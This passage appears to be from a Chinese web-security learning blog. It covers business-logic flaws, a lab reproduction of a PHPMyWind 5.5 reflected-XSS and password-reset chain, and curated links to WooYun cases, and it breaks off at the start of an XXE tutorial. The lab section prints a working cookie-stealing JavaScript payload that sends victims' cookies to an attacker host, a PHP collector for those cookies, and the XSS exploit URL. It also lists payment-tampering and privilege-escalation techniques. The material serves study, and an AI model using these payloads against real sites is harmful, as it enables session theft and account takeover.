<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174335.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174408.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h4 id="批量猜解用户">批量猜解用户</h4>
<p>同样是注册功能，在输入用户名时，发现会提示用户名是否存在，猜测该位置可以猜测哪些用户注册过该网站。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121192039.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>抓取该位置数据包发现，会对用户名id进行判断，是否存在，是否符合规则，由此我们可以批量探测用户，发现可以批量探测已注册过的用户：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121191345.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h4 id="任意密码重置">任意密码重置</h4>
<p>在忘记密码功能，我们输入用户名正确后会进行短信验证码，通过手机验证码或者邮箱验证码。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121214403.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>在验证码功能中输入验证码进行验证，发现其中有一段JavaScript代码<code>document.userreg.yzm_mobile2.value=='no'</code>是用来验证验证码是否正确，那么就可以直接在控制台直接改变这个值就可以绕过验证码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121221300.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200121221556274.png" alt="image-20200121221556274"></p>
<h4 id="平行越权">平行越权</h4>
<blockquote>
<p>越权又可分为平行越权（相同用户）、垂直越权（低权限用户和高权限用户）、未授权访问（无需用户直接操作）。</p>
</blockquote>
<p>登录普通用户test2,查看用户敏感的页面：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122161744.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>发送到repteater数据包中，看到cookie中存在username参数，修改为已存在的用户名，发现返回包中可查看其他用户敏感信息。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122161815.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h3 id="PHPMyWind-5-5">PHPMyWind 5.5</h3>
<p>由于网上没有找到PHPMyWind5.5的源码，只能看看其他师傅分析的文章，这里就再大概复述一遍。</p>
<p>首先对实验环境做一个简单说明：</p>
<table>
<thead>
<tr>
<th>服务器</th>
<th>192.168.114.159</th>
<th>部署有“PHPMyWind 5.5”</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击机（safedog）</td>
<td>192.168.114.1</td>
<td>部署有能“收集PHPMyWind用户的Cookie”的PHP脚本、JS脚本</td>
</tr>
<tr>
<td>受害者（victim）</td>
<td>192.168.114.161</td>
<td>可通过浏览器访问“服务器”上的“PHPMyWind”网站</td>
</tr>
</tbody>
</table>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122150706.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<ol>
<li>过程1代表攻击者safedog通过邮件等方式发送恶意链接（嵌有可盗取并发送Cookie的JS脚本）给受害者victim；</li>
<li>过程2代表在受害者victim受诱导点击恶意链接后，会经由浏览器将攻击者safedog嵌入的JS脚本当做数据发送给服务器上的PHPMyWind网站的反射型XSS漏洞点；</li>
<li>过程3与过程4代表PHPMyWind网站在受到反射型XSS攻击后，会执行JS脚本，将受害者victim的Cookie返回给受害者victim，并发送给攻击者safedog。</li>
<li>过程5代表攻击者safedog在获得受害者victim的Cookie后，利用受害者victim的Cookie与PHPMyWind网站的逻辑漏洞点进行密码重置攻击。</li>
</ol>
<h4 id="反射型XSS">反射型XSS</h4>
<p>攻击者搭建可接收受害者Cookie的PHP网站；</p>
<p>该PHP网站由“ReflectiveXSS.js”“ReflectiveXSS.php”和“cookie.txt”这3个文件构成。</p>
<p>其中“ReflectiveXSS.js”用于针对服务器端PHPMyWind网站的反射型XSS漏洞窃取受害者victim的Cookie，并将该Cookie值传输给ReflectiveXSS.php；“ReflectiveXSS.php”用于接收名为“victimcookie”的GET请求，并将“victimcookie”的参数值保存到“cookie.txt”。</p>
<p>ReflectiveXSS.js的代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过指定的名称&#x27;img&#x27;创建img元素</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将img元素的src属性指向脚本文件ReflectiveXSS.php</span></span><br><span class="line"><span class="comment">//将cookie信息的字符串作为URI组件进行编码，然后用victimcookie参数传递</span></span><br><span class="line">img.src = <span class="string">&#x27;http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>
<p>ReflectiveXSS.php的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;victimcookie&#x27;</span>];</span><br><span class="line">    $filePath = <span class="string">&quot;cookie.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_writable($filePath)==<span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;can&#x27;t write&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $handler = fopen($filePath, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">          fwrite($handler, $str);</span><br><span class="line">          fclose($handler);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>出发XSS漏洞的EXP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.114.159&#x2F;phpmywind5-5&#x2F;data&#x2F;api&#x2F;oauth&#x2F;connect.php?method&#x3D;unknownmethod&lt;script src&#x3D;http:&#x2F;&#x2F;192.168.114.1&#x2F;safedog-attack&#x2F;ReflectiveXSS.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>出现XSS漏洞的地方：</p>
<p>该漏洞出现的文件路径为：/data/api/oauth/connect.php，其中的代码段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists($connect, $method))</span><br><span class="line">    $connect-&gt;method();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请求的方法[&quot;</span> . $method . <span class="string">&quot;不存在&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>if判断的作用是“判断函数名是否存在”，代码的逻辑是“如果函数名不存在，则在PHP页面输出函数名”，这一做法会造成反射型XSS漏洞。</p>
<h4 id="任意密码重置-v2">任意密码重置</h4>
<p>该漏洞出现的文件路径为：/member.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检测旧密码是否正确</span></span><br><span class="line"><span class="keyword">if</span>($password != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $oldpassword = md5(md5($oldpassword));</span><br><span class="line">    $r = $dosql-&gt;GetOne(<span class="string">&quot;SELECT `password` FROM `#@__member` WHERE `username`=&#x27;<span class="subst">$c_uname</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">&#x27;password&#x27;</span>] != $oldpassword)</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(msg: <span class="string">&#x27;抱歉，旧密码错误！&#x27;</span>, gourl: <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;UPDATE `#@__member` SET&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($password != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $password = md5(md5($password));</span><br><span class="line">    $sql .= <span class="string">&quot;password=&#x27;<span class="subst">$password</span>&#x27;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@$sql .= <span class="string">&quot;question=&#x27;<span class="subst">$question</span>&#x27;, answer=&#x27;<span class="subst">$answer</span>&#x27;, cnname=&#x27;<span class="subst">$cnname</span>&#x27;, enname=&#x27;<span class="subst">$enname</span>&#x27;, sex=&#x27;<span class="subst">$sex</span>&#x27;, birthtype=&#x27;<span class="subst">$birthtype</span>&#x27;, birth_year=&#x27;<span class="subst">$birth_year</span>&#x27;, birth_month=&#x27;<span class="subst">$birth_month</span>&#x27;, birth_day=&#x27;<span class="subst">$birth_day</span>&#x27;, astro=&#x27;<span class="subst">$astro</span>&#x27;, bloodtype=&#x27;<span class="subst">$bloodtype</span>&#x27;, trade=&#x27;<span class="subst">$trade</span>&#x27;, live_prov=&#x27;<span class="subst">$live_prov</span>&#x27;, live_city=&#x27;<span class="subst">$live_city</span>&#x27;, live_country=&#x27;<span class="subst">$live_country</span>&#x27;, home_prov=&#x27;<span class="subst">$home_prov</span>&#x27;, home_city=&#x27;<span class="subst">$home_city</span>&#x27;, home_country=&#x27;<span class="subst">$home_country</span>&#x27;, cardtype=&#x27;<span class="subst">$cardtype</span>&#x27;, cardnum=&#x27;<span class="subst">$cardnum</span>&#x27;, intro=&#x27;<span class="subst">$intro</span>&#x27;, email=&#x27;<span class="subst">$email</span>&#x27;, qqnum=&#x27;<span class="subst">$qqnum</span>&#x27;, mobile=&#x27;<span class="subst">$mobile</span>&#x27;, telephone=&#x27;<span class="subst">$telephone</span>&#x27;, address_prov=&#x27;<span class="subst">$address_prov</span>&#x27;, address_city=&#x27;<span class="subst">$address_city</span>&#x27;, address_country=&#x27;<span class="subst">$address_country</span>&#x27;, address=&#x27;<span class="subst">$address</span>&#x27;, zipcode=&#x27;<span class="subst">$zipcode</span>&#x27; WHERE id=&#x27;<span class="subst">$id</span>&#x27; AND `username`=&#x27;<span class="subst">$c_uname</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($dosql-&gt;ExecNoneQuery($sql))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(msg: <span class="string">&#x27;资料更新成功&#x27;</span>, gourl: <span class="string">&#x27;?c=edit&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个if判断的作用是“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，才会进行‘旧密码的比对’，如果提交的旧密码和数据库的查询结果不一致，则不允许继续进行更换密码的操作。第二个if判断的作用仍为“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，对新密码进行哈希运算，随后进行SQL语句的拼接。这两个if语句存在了逻辑漏洞。因为，如果我们提交的新密码（password变量和repassword变量）为空，则可以绕过对旧密码（oldpassword变量）的验证。</p>
<p>在这里之所以要使用XSS获取cookie，是因为当SQL语句满足条件<code>id='$id' AND username ='$c_uname';</code>时，才可进行update操作。变量<code>c_uname</code>值（明文）来源于<code>AuthCode($_COOKIE['username'])</code>，即先取得Cookie中username(密文)的值，然后通过AuthCode函数配合配置文件中的密钥来获取明文。</p>
<p>PHPMyWind采用Cookie保存混淆化的用户登录信息。因为配置文件中的密钥是在CMS搭建时随机生成的，算法也不可逆，因此要在知道c_name变量的前提下，从正向伪造username等变量，以通过权限验证具有较大难度。为获取Cookie中的username等值，可考虑借助反射型XSS漏洞。</p>
<h3 id="其他实例">其他实例</h3>
<p>现在wooyun已经没了，只能在一些镜像网站看漏洞合集，以<code>逻辑漏洞</code>为关键词搜索到了186个相关漏洞，基本上把每个漏洞都过了一遍，也没办法复现，记录一些比较有代表性的案例，权当搜集思路吧。</p>
<h4 id="支付业务相关逻辑漏洞">支付业务相关逻辑漏洞</h4>
<h5 id="常见手法">常见手法</h5>
<ul>
<li>修改金额；</li>
<li>修改商品数量；</li>
<li>修改优惠金额；</li>
<li>修改数量、单价，优惠价格参数为负数、小数，无限大；</li>
<li>商品价格更改；</li>
<li>支付key泄露等。</li>
</ul>
<p>实际安全中会有一些比较特别的，反正各种能改的参数都去尝试。个数<em>单价-优惠券个数</em>单价=总额，每个值都可能存在问题，就看服务自身处理是否有问题了。</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2011-02272.html">顺丰宝业务逻辑漏洞</a>：数量和金额没有做签名</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2011-02513.html">移动手机支付业务逻辑漏洞</a>：爆破四位验证码</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-019761.html">新东方逻辑支付漏洞</a>：修改运费金额为负数，使得课程金额+运费大于0即可</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-074483.html">中国零食网支付逻辑漏洞</a>：同上</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-023789.html">阿里云计算按量付费逻辑漏洞一枚（低价享受超级主机）</a>：经过base64编码的数据可以被篡改，并且后端会接受篡改的数据</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-036787.html">乐视商城支付逻辑漏洞（价格可更改）</a>：价格参数明文显示在url，可以直接更改</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053181.html">再次挖掘乐视商城支付逻辑漏洞</a>：同上</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-051673.html">读览天下支付逻辑漏洞可刷充值金额</a>：替换支付订单号</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-093365.html">益盟爱炒股商城支付逻辑漏洞</a>：修改Cookie中的参数值</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0125060.html">饿了么逻辑漏洞之免费吃喝不是梦</a>：<code>手机号+;+手机号</code>绕过服务器对手机号码的次数限制</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0135459.html">七夕单身专场之性多多免费刷成人用品(支付逻辑漏洞)</a>：改负数刷代币</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0194751.html">大疆某处支付逻辑漏洞可1元买无人机</a>：https改为http访问，修改支付的参数</p>
<h4 id="密码找回相关逻辑漏洞">密码找回相关逻辑漏洞</h4>
<h5 id="常见手法-v2">常见手法</h5>
<ul>
<li>
<p>找回密码的验证码为四位数字可爆破真实验证码；</p>
</li>
<li>
<p>采用本地验证,可以先尝试修改自己的帐号密码，保存正确的返回包，然后修改他人密码的时候替换返回包；</p>
</li>
<li>
<p>最终修改密码的数据包，以另外的ID作为身份判断（例如userid），而该ID在别处可以获取到；</p>
</li>
<li>
<p>接受验证码的手机号修改为自己的号码，然后输入自己的号码接收到的验证码去进行密码重置；</p>
</li>
<li>
<p>获取验证码的时候，会生成一个身份标识（例如cookie值），那么我们就替换他人账号的身份证重置他人的密码；</p>
</li>
</ul>
<p>具体可以去i春秋看carry_your发过的一篇专门针对<a href="https://www.ichunqiu.com/course/59045">密码重置的视频</a>。</p>
<p><strong>用户凭证暴力破解</strong></p>
<p>四位或者六位的纯数字</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011833.html">WooYun: 当当网任意用户密码修改漏洞</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html">WooYun: 微信任意用户密码修改漏洞</a></p>
<p><strong>返回凭证</strong></p>
<p>url返回验证码及token</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-05630.html">WooYun: 走秀网秀团任意密码修改缺陷</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-058210.html">WooYun: 天天网任意账户密码重置（二）</a></p>
<p><strong>密码找回凭证在页面中</strong></p>
<p>通过密保问题找回密码</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-04728.html">WooYun: sohu邮箱任意用户密码重置</a></p>
<p><strong>返回短信验证码</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-085124.html">WooYun: 新浪某站任意用户密码修改（验证码与取回逻辑设计不当）</a></p>
<p><strong>邮箱弱token</strong></p>
<p>时间戳的md5</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08333.html">WooYun: 奇虎360任意用户密码修改漏洞</a></p>
<p><strong>用户名 &amp; 服务器时间</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-090226.html">WooYun: 中兴某网站任意用户密码重置漏洞（经典设计缺陷案例）</a></p>
<p><strong>用户凭证有效性</strong></p>
<p>短信验证码</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053349.html">WooYun: OPPO手机重置任意账户密码（3）</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053079.html">WooYun: 第二次重置OPPO手机官网任意账户密码（秒改）</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020032.html">WooYun: OPPO修改任意帐号密码</a></p>
<p><strong>邮箱token</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-012572.html">WooYun: 身份通任意密码修改-泄漏大量公民信息</a></p>
<p><strong>重置密码token</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html">WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置</a></p>
<p><strong>重新绑定</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08307.html">WooYun: 网易邮箱可直接修改其他用户密码</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115537.html">WooYun: 如家酒店某严重逻辑漏洞可登陆任意账号可导致几千万敏感信息泄露（涉及任意用户账号个人基本信息、入住记录等）</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115276.html">Wooyun: 华住酒店官网某严重逻辑漏洞可登陆任意账号（涉及任意用户账号个人基本信息、入住记录等）</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-081467.html">WooYun: 12308可修改任意用户密码</a></p>
<p><strong>邮箱绑定</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-092319.html">WooYun: 某彩票设计缺陷可修改任意用户密码</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-086726.html">WooYun: 中国工控网任意用户密码重置漏洞</a></p>
<p><strong>服务器验证</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-018263.html">WooYun: 携程旅行网任意老板密码修改(庆在wooyun第100洞)</a></p>
<p><strong>服务器验证可控内容</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-080278.html">WooYun: AA拼车网之任意密码找回2</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-082582.html">WooYun: 四川我要去哪517旅行网重置任意账号密码漏洞</a></p>
<p><strong>服务器验证验证逻辑为空</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088927.html">WooYun: 某政企使用邮件系统疑似存在通用设计问题</a></p>
<p><strong>用户身份验证</strong></p>
<p>账号与手机号码的绑定</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-075941.html">WooYun: 上海电信通行证任意密码重置</a></p>
<p><strong>账号与邮箱账号的绑定</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html">WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-091216.html">WooYun: 和讯网修改任意用户密码漏洞</a></p>
<p><strong>找回步骤</strong></p>
<p>跳过验证步骤、找回方式，直接到设置新密码页面</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042404.html">WooYun: OPPO手机同步密码随意修改，短信通讯录随意查看</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-098765.html">WooYun: 中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p>
<p><strong>本地验证</strong></p>
<p>在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-083035.html">WooYun: 看我如何重置乐峰网供应商管理系统任意用户密码（管理员已被重置）</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-069987.html">WooYun: oppo重置任意用户密码漏洞(4)</a></p>
<p><strong>发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020532.html">WooYun: OPPO修改任意帐号密码-3</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020425.html">WooYun: OPPO修改任意帐号密码-2</a></p>
<p><strong>注入</strong></p>
<p>在找回密码处存在注入漏洞</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-068060.html">WooYun: 用友人力资源管理软件（e-HR）另一处SQL注入漏洞（通杀所有版本）</a></p>
<p><strong>Token生成</strong></p>
<p>token生成可控</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-094242.html">WooYun: 天天网任意账号密码重置(非暴力温柔修改)</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-095729.html">WooYun: 天天网再一次重置任意账号密码(依旧非暴力)</a></p>
<p><strong>注册覆盖</strong></p>
<p>注册重复的用户名</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088708.html">WooYun: 中铁快运奇葩方式重置任意用户密码(admin用户演示)</a></p>
<p><strong>session覆盖</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-085843.html">WooYun: 聚美优品任意修改用户密码(非爆破)</a></p>
<h4 id="越权相关逻辑漏洞">越权相关逻辑漏洞</h4>
<p>越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p>
<h5 id="常见手法-v3">常见手法</h5>
<ul>
<li>操作时分析请求中的数据包，看看每个参数的作用，修改参数查看变化。</li>
<li>拥有更多权限的账号，把能访问的URL都提取出来，给低权限用户访问或者直接访问，查看能否访问。</li>
<li>猜测隐藏的API，如:guest/getorder，修改成admin/getorder。</li>
<li>通过搜索引擎，或者提取JS中的URL，查找隐藏功能。如burpsuite中有一个BHP JS scraper的插件。</li>
<li>猜测隐藏的参数，添加进去查看变化，如修改信息的时候加个ID。</li>
<li>抓取所有的数据包，搜索用户名等关键词，比如我的用户名是test，在burpsuite中的HTTP history搜索test，看看有没有哪个数据包包含这个参数,将其修改为其他的用户名，查看变化。</li>
</ul>
<p><a href="https://mp.weixin.qq.com/s/-CWizFUofM78DkvymqEHiA">JSRC——越权漏洞挖掘</a></p>
<p><a href="https://mp.weixin.qq.com/s/1mapo4wno1uMctrIEJwKvQ">JSRC——聊聊越权那些事</a></p>
<p><a href="https://wooyun.x10sec.org/static/drops/tips-727.html">我的越权之道</a></p>
<p>垂直越权的手法：</p>
<ul>
<li>
<p>编辑个人信息的时候，修改权限组的id，一般管理员的值为0或者1；</p>
</li>
<li>
<p>后台修改密码的地方，如果是根据userid来修改密码的，可以修改id的值来修改管理员的密码；</p>
</li>
<li>
<p>在个人资料处插入XSS脚本，一般能打到管理员cookie的概率很大；</p>
</li>
<li>
<p>查看个人资料的时候，如果是根据id来显示，一般都有越权，可以遍历id获取管理员信息；</p>
</li>
<li>
<p>测试后台功能，找一下注入、上传、命令执行等漏洞，直接拿下数据库权限或者shell，再找管理员权限就轻而易举了。</p>
</li>
</ul>
<h3 id="其他资料">其他资料</h3>
<p><a href="https://github.com/PyxYuYu/MyBlog/issues/102">业务逻辑漏洞总结</a></p>
<p><a href="https://mp.weixin.qq.com/s/-r1oWQb_oS8jEMdJs9Ct_g">JSRC——业务逻辑漏洞挖掘</a></p>
<p><a href="https://mp.weixin.qq.com/s/ElICF5Uja7-sNJnGhrG_9Q">JSRC——交易支付漏洞挖掘</a></p>
<p><a href="https://mp.weixin.qq.com/s/RMx1tqAcmqjxFvolHGAovw">JSRC——Web漏洞之逻辑漏洞挖掘</a></p>
<p><a href="https://mp.weixin.qq.com/s/Y8yLweZn6JbRClucLazOeg">JSRC——批量Web漏洞挖掘</a></p>
<h2 id="Reference">Reference</h2>
<p><a href="https://xz.aliyun.com/t/6401#toc-5">[红日安全]Web安全Day6 - 业务逻辑漏洞实战攻防</a></p>
<p><a href="http://bobao.360.cn/learning/detail/287.html">密码找回逻辑漏洞总结</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全学习</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之XXE漏洞利用</title>
    <url>/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全学习之XXE漏洞利用">Web安全学习之XXE漏洞利用</h1>
<h2 id="什么是XXE">什么是XXE</h2>
<p>XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。</p>
<p>XML（Extensible Markup Language）英文直译就是可扩展标记语言，“标记” 是指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。</p>
<p>如果把 HTML 和 XML 进行对比的话， HTML 旨在显示数据信息，而 XML 旨在传输数据信息。（说到传输数据自然而然肯定会想到json格式，相比XML，现在用的更多是json格式来传输数据）</p>
<h3 id="XML基本知识">XML基本知识</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>ca01h<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>njupt<span class="tag">&lt;/<span class="name">from</span>&gt;</span>xml</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在上面代码中的第一行，定义XML的版本与编码。</p>
<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p>
<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
<h3 id="实体">实体</h3>
<p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
<p>实体总共有四种，分别是：</p>
<ul>
<li>
<p>内置实体 (Built-in entities)</p>
</li>
<li>
<p>字符实体 (Character entities)</p>
</li>
<li>
<p>通用实体 (General entities)</p>
</li>
<li>
<p>参数实体 (Parameter entities)</p>
</li>
</ul>
<p>其中内置实体和字符实体都和 HTML 的实体编码类似，但如果从另一个角度看，实体完全可以分成两个派别：通用实体和参数实体。</p>
<h3 id="DTD">DTD</h3>
